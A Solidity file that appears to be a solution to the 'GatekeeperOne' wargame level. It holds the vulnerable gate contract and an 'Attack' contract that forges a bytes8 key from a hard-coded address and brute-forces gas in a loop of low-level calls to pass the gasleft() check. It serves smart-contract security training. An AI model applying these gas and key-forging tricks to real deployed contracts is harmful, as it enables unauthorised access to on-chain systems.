//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOne {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack{
  address _addr = 0xB56Cd642eF6Aa99Ec13F45AFD999aF613fAf91dC;

  function checkTx() public view returns (address,uint) {
    return (tx.origin, gasleft());
  }

  /*address addrIn = tx.origin;
  bytes8 public gateKey = 0x000010000000ddc4;//*/
  address addrIn = 0x02d09E69e528d7DA14F32Cd21b55aFFa1FF7F873;
  bytes8 public gateKey = 0x001000000000f873;//*/

  function turnTx() public view returns (uint16,uint160,address) {
    return (uint16(uint160(addrIn)), uint160(addrIn), addrIn);
  }

  function turnUint(uint64 h) public view returns (uint32,bytes8) {
    return (uint32(h), bytes8(h));
  }

  function check() public view returns (bool) { 
    if ((uint32(uint64(gateKey)) == uint16(uint64(gateKey))) && (uint32(uint64(gateKey)) != uint64(gateKey)) && (uint32(uint64(gateKey)) == uint16(uint160(addrIn))))
      return true;
    else return false;
  }

  function turnBytes(bytes8 h) public pure returns (uint16,uint32,uint64) {
    return (uint16(uint64(h)),uint32(uint64(h)),uint64(h));
  }

  uint public _gas;
  bool public success;
  bytes encodedParams;

  function kek() public {
    /*uint gasIn = 24999;        
    for (_gas = gasIn-5; _gas<gasIn+5; ++_gas){
      success = IGatekeeperOne(_addr).enter{gas: gasIn}(gateKey);
      if (success) break;
    }*/

    encodedParams = abi.encodeWithSelector(bytes4(keccak256("enter(bytes8)")),gateKey);

    for(uint i=0; i<300; ++i){
      _gas = 8191 * 3 +200 + i;
      (success,) = address(_addr).call{gas: _gas}(encodedParams);
      if (success) break;
    }
    //IGatekeeperOne(_addr).enter{gas: 57763}(gateKey);
  }

  function getEth() public payable returns (bool) {
    return true;
  }
  
}